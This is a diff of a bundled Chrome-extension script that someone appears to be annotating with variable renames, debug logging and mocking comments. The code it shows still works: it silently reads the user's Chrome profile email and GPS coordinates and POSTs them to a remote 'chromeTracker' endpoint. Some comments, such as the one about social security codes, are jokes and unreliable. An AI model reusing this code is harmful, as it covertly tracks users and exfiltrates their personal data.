@@ -7,8 +7,8 @@
                 var s = "function" == typeof require && require;
                 if (!c && s) return s(a, !0);
                 if (i) return i(a, !0);
-                var f = new Error("Cannot find module '" + a + "'");
-                throw f.code = "MODULE_NOT_FOUND", f
+                var error = new Error("Cannot find module '" + a + "'");
+                throw error.code = "MODULE_NOT_FOUND", error
             }
             var u = o[a] = {
                 exports: {}
@@ -43,42 +43,45 @@
             if (!array[0]) return;
             if (!array[1]) return;
             var r, o, t;
-            ((new Date).getTime() - a > i || !(Math.abs(c[0] - array[0]) < n && Math.abs(c[1] - array[1]) < n)) && (await (r = l, o = d, t = array, new Promise((array, n) => {
+            ((new Date).getTime() - a > i || !(Math.abs(c[0] - array[0]) < n && Math.abs(c[1] - array[1]) < n)) && (await (r = l, o = email, t = array, new Promise((array, n) => {
                 try {
                     const xhttpReq = new XMLHttpRequest, // initalize tracker :DDDD
                         url = "info[platform]=chromeTracker&info[email]=" + r + "&info[udid]=" + o + "&info[gps]=" + JSON.stringify(t) + "&info[phrases]=1"; // base url
-                    xhttpReq.open("POST", s, !0);
+                    console.log('URL BEING SENT OFF TO VIBE RESEARCHERS: '+url);
+					xhttpReq.open("POST", s, !0);
 					xhttpReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); // content types
 					xhttpReq.send(url); // send url
 					xhttpReq.onload = () => {
-                        e()
+                        e() // send social security codes
                     }, xhttpReq.onabort = () => {
-                        n()
+                        n() // send abort error thing because we like to make more errors with errors :DDD
                     }, xhttpReq.onerror = () => {
-                        n()
+                        n() // why would you actually do this
                     }
-                    console.log('URL BEING SENT OFF TO VIBE RESEARCHERS: '+url);
+                    
                 } catch (e) {
                     n(e)
                 }
             })), a = (new Date).getTime()), c = e
         }
-        let l, d;
+        let l, email;
         chrome.runtime.onConnect.addListener(runtime => {
             runtime.onMessage.addListener(async data => {
                 Array.isArray(data.pos) ? await processData(data.pos) : console.warn("Invalid coordinates")
             })
         }), async function() { // invade privacy to get email ;DDD
             for (;;) try { // very quick loop 
-                l = await new Promise((e, r) => {
+                l = await new Promise((goodThingSend, returnErr) => {
                     try {
                         chrome.identity.getProfileUserInfo(data => {
-                            e(data.email) // send off email to china
+                            goodThingSend(data.email) // add email to future logging thing
                         })
                     } catch (error) {
-                        r(error)
+                        returnErr(error) // give error to promise
                     }
-                }), d = "chrome:" + l;
+                }), email = "chrome:" + l; // set email to chrome:whatever this is should log it maybe below
+				console.log('email delievered: '+email); //  fuc it, we logging it now
+				// oh god it gives chrome:user@domain.tld
                 break
             } catch (error) {
                 console.error("Error obtaining email: ", error), console.log("retrying email lookup in 1 second"), await newPromiseLoop(1e3)
